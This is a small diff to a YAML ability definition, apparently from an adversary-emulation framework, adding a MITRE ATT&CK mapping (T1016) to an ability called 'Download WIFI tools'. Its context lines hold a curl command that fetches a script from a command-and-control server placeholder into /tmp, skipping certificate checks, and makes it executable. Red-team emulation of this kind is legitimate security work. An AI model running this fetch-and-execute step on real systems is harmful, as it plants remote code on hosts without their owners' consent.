@@ -4,6 +4,9 @@
   name: Download WIFI tools
   description: Download a set of commands for manipulating WIFI
   tactic: discovery
+  technique:
+    attack_id: T1016
+    name: System Network Configuration Discovery
   command: |
     curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
     chmod +x /tmp/wifi.sh
